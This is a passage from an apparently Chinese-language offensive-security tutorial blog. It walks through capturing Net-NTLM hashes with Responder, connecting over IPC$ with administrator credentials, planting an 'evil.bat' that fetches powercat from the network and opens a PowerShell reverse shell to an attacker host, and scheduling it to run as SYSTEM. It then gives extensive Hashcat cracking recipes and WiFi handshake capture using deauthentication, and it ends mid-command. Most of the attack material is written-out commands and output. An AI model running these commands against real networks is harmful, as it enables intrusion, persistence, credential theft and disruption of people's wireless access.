class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>NetBIOS 协议是由 IBM 公司开发，主要用于数十台计算机的小型局域网，根据 NetBIOS 协议广播获得计算机名称，并将其解析成相应的 IP 地址。</p><p>从 Windows NT 以后版本的所有操作系统中都可以使用 NetBIOS，不过 NetBIOS 不支持 IPv6.</p><p>NetBIOS 提供的三种服务：</p><pre><code>i、NetBIOS-NS（名称服务）：主要用于名称注册和解析，以启动会话和分发数据报，该服务默认监听 UDP 137 端口，也可以使用 TCP 的 137 端口进行监听。ii、Datagram Distribution Service（数据报分发服务）：无连接服务，该服务负责进行错误检测和恢复，默认监听 UDP 138 端口。iii、Session Service（会话服务）：允许两台计算机建立连接，默认使用 TCP 139 端口。</code></pre><h3 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h3><blockquote><p>NTLM 即 NT LAN Manager，NTLM 是指 telnet 的一种验证身份方式，即问询/应答协议，是 Windows NT 早期版本的标准安全协议。</p></blockquote><p>Net-NTLM Hash 不同于 NTLM Hash，NTLM Hash 是 Windows 登录密码的 Hash 值，可以在 Windows 系统的 SAM 文件或者域控的 NTDS.dit 文件中提取到出来，NTLM Hash 支持哈希传递攻击。 </p><p>Net-NTLM Hash 是网络环境下 NTLM 认证的 Hash，使用 Responder 抓取的通常就是 Net-NTLM Hash，该 Hash 不能进行哈希传递，但可用于 NTLM 中继攻击或者使用 Hashcat 等工具碰撞出明文进行横向。</p><h2 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h2><p>Responder 是一款使用 Python 编写用于毒化 LLMNR 和 NBT-NS 请求的一款工具。</p><p>假设我们已连接到 Windows Active Directory 环境，当网络上的设备尝试用 LLMNR 和 NBT-NS（NetBIOS 名称服务）请求来解析目标机器时，Responder 就会伪装成目标机器。</p><p>当受害者机器尝试登陆攻击者机器，Responder 就可以获取受害者机器用户的 Net-NTLM 哈希值。</p><p>Responder 项目地址：<a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p><p>Responder 不支持 Windows，这里使用 Kali 进行演示。</p><p>Responder 开启监听，-I 指定网卡，这里 eth1 的 IP 为 192.168.7.65</p><pre class="line-numbers language-none"><code class="language-none">python Responder.py -I eth1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听后，当目标主机上有人访问 Responder 主机的共享目录时，就会看到对方的 Net-NTLM 哈希值了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729190444.png"></p><p>再利用 Hashcat 进行碰撞</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 5600 hash.txt password.txt -D 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729190835.png"></p><h1 id="0x19-IPC-与计划任务"><a href="#0x19-IPC-与计划任务" class="headerlink" title="0x19 IPC 与计划任务"></a>0x19 IPC 与计划任务</h1><h2 id="0、前言-4"><a href="#0、前言-4" class="headerlink" title="0、前言"></a>0、前言</h2><p>在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。</p><h2 id="1、IPC"><a href="#1、IPC" class="headerlink" title="1、IPC"></a>1、IPC</h2><p>IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限。</p><p>建立 IPC 连接：</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入 net use 可以查看当前建立的连接</p><pre class="line-numbers language-none"><code class="language-none">C:\&gt;net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator命令成功完成。C:\&gt;net use会记录新的网络连接。状态       本地        远程                      网络-------------------------------------------------------------------------------OK                     \\192.168.7.107\ipc$      Microsoft Windows Network命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>映射磁盘到本地</p><pre class="line-numbers language-none"><code class="language-none">net use t: \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想删除映射的磁盘</p><pre class="line-numbers language-none"><code class="language-none">net use t: &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>dir 列出对方目录</p><pre class="line-numbers language-none"><code class="language-none">dir \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;dir \\192.168.7.107\c$ 驱动器 \\192.168.7.107\c$ 中的卷没有标签。 卷的序列号是 BC2F-8F01 \\192.168.7.107\c$ 的目录2020&#x2F;11&#x2F;24  17:28    &lt;DIR&gt;          Program Files2020&#x2F;11&#x2F;24  17:26    &lt;DIR&gt;          Program Files (x86)2021&#x2F;02&#x2F;13  17:49    &lt;DIR&gt;          TEMP2021&#x2F;08&#x2F;02  11:42    &lt;DIR&gt;          Users2020&#x2F;11&#x2F;25  08:37    &lt;DIR&gt;          Windows               0 个文件              0 字节              5 个目录 32,833,009,664 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>tasklist 查看进程</p><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX映像名称                       PID 会话名              会话#       内存使用&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;System Idle Process              0                            0         24 KSystem                           4                            0        368 Ksmss.exe                       260                            0        628 Kcsrss.exe                      356                            0      2,360 Kwininit.exe                    408                            0        264 Kcsrss.exe                      420                            1      8,692 Kwinlogon.exe                   468                            1      2,012 Kservices.exe                   512                            0      7,460 Klsass.exe                      520                            0     10,216 Klsm.exe                        528                            0      4,148 Kspoolsv.exe                   1356                            0      6,504 Ksvchost.exe                   1392                            0      7,028 K<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 \del 可断开连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了。</p><p>这里看看在建立 IPC 连接后，使用计划任务运行可执行文件，主要步骤如下：</p><p>1、查看目标主机时间</p><p>2、上传可执行文件到目标主机</p><p>3、设置计划任务执行可执行文件</p><p>4、删除计划任务</p><p>首先查看下目标主机时间</p><pre class="line-numbers language-none"><code class="language-none">net time \\192.168.7.107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;net time \\192.168.7.107\\192.168.7.107 的当前时间是 2021&#x2F;8&#x2F;2 14:28:01命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建一个反弹木马 bat 程序，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.7.4 -p 4444 -e cmd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在攻击机上开启 nc 监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 bat 程序上传到目标主机</p><pre class="line-numbers language-none"><code class="language-none">copy evil.bat \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 at 创建计划任务</p><pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 14:30 C:\evil.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想清除 ID 为 1 的计划任务</p><pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 1 &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 schtasks 创建计划任务</p><pre class="line-numbers language-none"><code class="language-none"># 开机以 system 权限执行 C:\evil.batschtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;sc onstart &#x2F;tr C:\evil.bat &#x2F;ru system &#x2F;f# 在 2021&#x2F;08&#x2F;03 前的每一天的 14:30:00 执行 C:\evil.batschtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;tr C:\evil.bat &#x2F;sc daily &#x2F;st 14:30:00 &#x2F;ed 2021&#x2F;08&#x2F;03# 立刻运行名称为 evil 的任务schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想清除名称为 evil 的计划任务</p><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;delete &#x2F;s 192.168.7.107 &#x2F;tn &quot;evil&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在建立 IPC 连接后，除了使用计划任务进行间接的反弹 Shell，还可以通过 PsExec 直接反弹 Shell</p><p>PsExec 下载地址：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><pre class="line-numbers language-none"><code class="language-none">Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210802180916.png"></p><h1 id="0x20-Hashcat-的使用"><a href="#0x20-Hashcat-的使用" class="headerlink" title="0x20 Hashcat 的使用"></a>0x20 Hashcat 的使用</h1><h2 id="1、介绍-6"><a href="#1、介绍-6" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台。</p><p>工具地址：<a href="https://hashcat.net/">https://hashcat.net</a></p><p>项目地址：<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p><h2 id="2、安装-3"><a href="#2、安装-3" class="headerlink" title="2、安装"></a>2、安装</h2><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>Mac 用户直接使用 brew 安装即可</p><pre class="line-numbers language-none"><code class="language-none">brew install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p>对于 Debain 的 Linux，比如 Kali、Ubuntu 可以直接使用 apt 进行安装</p><pre class="line-numbers language-none"><code class="language-none">apt install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者下载官方二进制文件进行安装</p><p>在 <a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，这里以 6.2.4 版为例</p><pre class="line-numbers language-none"><code class="language-none">tar zxvf hashcat-6.2.4.7zcd hashcat-6.2.4chmod +x hashcat.bin.&#x2F;hashcat.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p>在 <a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，解压后可以看到 hashcat.exe</p><h2 id="3、使用-3"><a href="#3、使用-3" class="headerlink" title="3、使用"></a>3、使用</h2><p>常用参数：</p><pre class="line-numbers language-none"><code class="language-none">-r使用自定义破解规则-o指定破解成功后的 hash 及所对应的明文密码的存放位置-m指定要破解的 hash 类型，如果不指定类型，则默认是 MD5-a指定要使用的破解模式，其值参考后面对参数。“-a 0” 字典攻击，“-a 1” 组合攻击；“-a 3” 掩码攻击-D指定 opencl 的设备类型--show显示已经破解的 hash 及该 hash 所对应的明文--force忽略破解过程中的警告信息,跑单条 hash 可能需要加上此选项--remove删除已被破解成功的 hash--username忽略 hash 文件中的指定的用户名,在破解 linux 系统用户密码 hash 可能会用到--increment启用增量破解模式,你可以利用此模式让 hashcat 在指定的密码长度范围内执行破解过程--increment-min密码最小长度,后面直接等于一个整数即可,配置 increment 模式一起使用--increment-max密码最大长度,同上--outfile-format指定破解结果的输出格式 id ,默认是 3--self-test-disable    关闭启动自检<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-a 破解模式：</p><pre class="line-numbers language-none"><code class="language-none">0 | Straight（字段破解）1 | Combination    （组合破解）3 | Brute-force    （掩码暴力破解）6 | Hybrid Wordlist + Mask（字典+掩码破解）7 | Hybrid Mask + Wordlist（掩码+字典破解）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-D 指定设备类型</p><pre class="line-numbers language-none"><code class="language-none">1 | CPU2 | GPU3 | FPGA, DSP, Co-Processor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般使用 -D 2 指定 GPU 破解</p><p>掩码设置：</p><pre class="line-numbers language-none"><code class="language-none">l | abcdefghijklmnopqrstuvwxyz纯小写字母u | ABCDEFGHIJKLMNOPQRSTUVWXYZ纯大写字母d | 0123456789纯数字h | 0123456789abcdef十六进制小写字母和数字H | 0123456789ABCDEF    十六进制大写字母和数字s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~    特殊字符a | ?l?u?d?s键盘上所有可见的字符b | 0x00 - 0xff匹配密码空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>掩码设置举例：</p><pre class="line-numbers language-none"><code class="language-none">八位数字密码：?d?d?d?d?d?d?d?d八位未知密码：?a?a?a?a?a?a?a?a前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>自定义掩码规则：</p><pre class="line-numbers language-none"><code class="language-none">--custom-charset1 [chars]等价于 -1--custom-charset2 [chars]等价于 -2--custom-charset3 [chars]等价于 -3--custom-charset4 [chars]等价于 -4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在掩码中用 ?1、?2、?3、?4 来表示</p><p>注意：</p><ul><li>–custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</li><li>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</li></ul><p>另外 Hash 模式与 ID 的对照表由于太长，这里就不放了，可以直接 hashcat -h 进行查看</p><h2 id="4、示例"><a href="#4、示例" class="headerlink" title="4、示例"></a>4、示例</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>密码为 8 位数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force d54d1702ad0f8326224b817c796763c9 ?d?d?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码为 4 位小写字母+数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 4575621b0d88c303998e63fc74d165b0 -1 ?l?d ?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码为 1-4 位大写字母+数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 8fb5a3e7338ce951971d69be27fc5210 -1 ?u?d ?1?1?1?1 --increment --increment-min 1 --increment-max 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定特定字符集：123456abcdf!@+- 进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于在终端里可能会把部分字符识别为特殊字符，因此需要转义一下</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf\!\@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不知道目标密码的构成情况，可以直接使用 ?a 表示使用所有字符进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 19b9a36f0cab6d89cd4d3c21b2aa15be --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用字典破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 e10adc3949ba59abbe56e057f20f883e password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用字典批量破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 hash.txt password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字典组合破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 1 77b3e6926e7295494dd3be91c6934899 pwd1.txt pwd2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过测试，这里的字典组合破解，不是说简单的将两个字典的内容合并去重形成 1 个字典进行去重，而是说字典 1 的内容加上字典 2 的内容组合成一个字典，例如：</p><p>pwd1.txt 字典为：</p><pre class="line-numbers language-none"><code class="language-none">admintestroot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pwd2.txt 字典为：</p><pre class="line-numbers language-none"><code class="language-none">@2021123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么组合后的字典就是这样的：</p><pre class="line-numbers language-none"><code class="language-none">admin@2021admin123test@2021test123root@2021root123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字典+掩码破解，也是和上面一样的组合方法，只不过 pwd2.txt 换成了掩码</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 6 e120ea280aa50693d5568d0071456460 pwd1.txt ?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Mysql4-1-5"><a href="#Mysql4-1-5" class="headerlink" title="Mysql4.1/5"></a>Mysql4.1/5</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可以使用 select authentication_string from mysql.user; 查看当前数据库中的密码哈希值。</p></blockquote><h3 id="sha512crypt-6-SHA512-Unix"><a href="#sha512crypt-6-SHA512-Unix" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)"></a>sha512crypt $6$, SHA512 (Unix)</h3><p>sha512crypt $6$, SHA512 (Unix) 破解，为了避免系统误识别到特殊字符，这里为哈希值加了单引号</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X.&#39; ?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可通过 cat /etc/shadow 获取哈希值</p></blockquote><p>或者不删除用户名，直接使用 –username 参数</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1&#39; ?l?l?l?l?l --username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>NT Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>LM Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NetNTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 5500 teams.six::::822795daaf96s0a811fs6dd7b01dscssc601635cc1339basda6:e125cddcf51337asc7 -1 ?l?u ?1?1?1?1?d?d?d?d  --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSSQL-2005"><a href="#MSSQL-2005" class="headerlink" title="MSSQL (2005)"></a>MSSQL (2005)</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="WordPress-密码-hash"><a href="#WordPress-密码-hash" class="headerlink" title="WordPress 密码 hash"></a>WordPress 密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 400 --force &#39;$P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY&#x2F;&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>具体加密脚本在 ./wp-includes/class-phpass.php 的 HashPassword 函数</p></blockquote><h3 id="Discuz-用户密码-hash"><a href="#Discuz-用户密码-hash" class="headerlink" title="Discuz 用户密码 hash"></a>Discuz 用户密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>其密码加密方式 md5(md5($pass).$salt)</p></blockquote><h3 id="RAR-压缩密码"><a href="#RAR-压缩密码" class="headerlink" title="RAR 压缩密码"></a>RAR 压缩密码</h3><p>首先获取 rar 文件的 hash 值，我们可以使用另一款哈希破解工具 John 提供的 rar2john 工具将 rar 文件里的 hash 提取出来。</p><p>rar2john 下载地址：<a href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p><pre class="line-numbers language-none"><code class="language-none"># 获取 rar 文件 hashrar2john.exe 1.rar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>hashcat 支持 RAR3-hp 和 RAR5</p><p>对于 RAR5，示例如下：</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13000 --force &#39;$rar5$16$b06f5f2d4c973d6235e1a88b8d5dd594$15$a520dddcc53dd4e3930b8489b013f273$8$733969e5bda903e4&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于 RAR3-hp</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 12500 --force &#39;$RAR3$*0*5ba3dd697a8706fa*919ad1d7a1c42bae4a8d462c8537c9cb&#39; ?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>RAR3-hp 哈希头为 $RAR3$*0*，而不是 $RAR3$*1*，中间的数值是0（-hp）而不是1（-p），-p 尚未得到支持，只支持 -hp</p><p>关于 RAR 参数 -p 和 -hp 的区别：<br>-p：只对 RAR 文件加密，里面的目录和文件名没加密；<br>-hp：对目录中的文件名和子目录都进行加密处理</p></blockquote><h3 id="ZIP-压缩密码"><a href="#ZIP-压缩密码" class="headerlink" title="ZIP 压缩密码"></a>ZIP 压缩密码</h3><p>和 rar 破解过程一样，我们需要先提取 zip 文件的哈希值，这里可以使用 zip2john 进行获取，zip2john.exe 在上面下载的 rar2john.exe 的同级目录下。</p><pre class="line-numbers language-none"><code class="language-none"># 获取 zip 文件 hashzip2john.exe 1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 13600 &#39;$zip2$*0*3*0*18b1a7e7ad39cb3624e54622849b23c7*5b99*3*5deee7*a418cee1a98710adce9a*$&#x2F;zip2$&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里 ZIP 的加密算法使用的 AES256</p></blockquote><h3 id="office-密码"><a href="#office-密码" class="headerlink" title="office 密码"></a>office 密码</h3><p>和 rar 与 zip 破解过程一样，我们需要先提取 office 文件的哈希值，这里可以使用 office2john.py 进行获取，office2john.py 在上面下载的 rar2john.exe 和 zip2john.exe 的同级目录下。</p><pre class="line-numbers language-none"><code class="language-none"># 获取 office 文件 hashpython office2john.py 1.docx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>测试中发现 python 会出现告警信息，不过这个告警信息不会影响程序执行</p></blockquote><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 9600 &#39;$office$*2013*100000*256*16*cd8856416b1e14305a0e8aa8eba6ce5c*18cada7070f1410f3a836c0dfc4b9643*befcde69afeafb3e652719533c824413b00ce4a499589e5ac5bd7a7a0d3c4f3d&#39; --force ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里哈希头为 2013 所以使用 9600 破解模式，如果是 2010 则要使用 9500 破解模式，2007 则使用 9400 破解模式。</p></blockquote><h3 id="WIFI-密码"><a href="#WIFI-密码" class="headerlink" title="WIFI 密码"></a>WIFI 密码</h3><p>要破解 WIFI 密码，首先要抓到 WIFI 的握手包，要想得到 WIFI 的握手包，就需要在监听时刚好有设备连接了该 WIFI，但这就需要运气加成，因此可以我们可以主动将该 WIFI 的设备踢下去，一般设备就会自动连接该 WIFI，此时我们就抓到握手包了。</p><p><strong>抓取 WIFI 握手包</strong></p><p>1、将网卡处于监听状态</p><pre class="line-numbers language-none"><code class="language-none">airmon-ng check airmon-ng check kill &#x2F;&#x2F; 关闭影响监听状态的进程airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>wlan0 是网卡名称，一般都是 wlan0，如果不是则需要根据自己的情况进行修改，可通过 iwconfig 进行查看网卡的名称</p></blockquote><p>当使用 iwconfig 查看网卡名称变为 wlan0mon 说明此时网卡已经处于监听模式了</p><p>2、扫描可用 WIFI</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831104636.png"></p><p>3、获取wifi的握手包</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng -c (上一步扫描的 CH ) --bssid (想要破解 WIFI 的 bssid ) -w (握手文件存放目录) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里以 ssid 为 teamssix 的 WIFI 为例</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng -c 1 --bssid 5E:C1:1B:A2:37:F1 -w .&#x2F; wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了顺利得到 WIFI 的握手包，可以将该 WIFI 下的设备强制踢下去</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a (要破解的 wifi 的 bssid ) -c (强制踢下的设备的 MAC 地址) wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210831105351.png"></p><p>可以看到 teamssix 这个 WIFI 有一个设备正在连接，该设备的 MAC 地址为：38:26:2C:13:D3:33，使用以下命令可以将其强制踢下去</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 0 -a 5E:C1:1B:A2:37:F1 -c 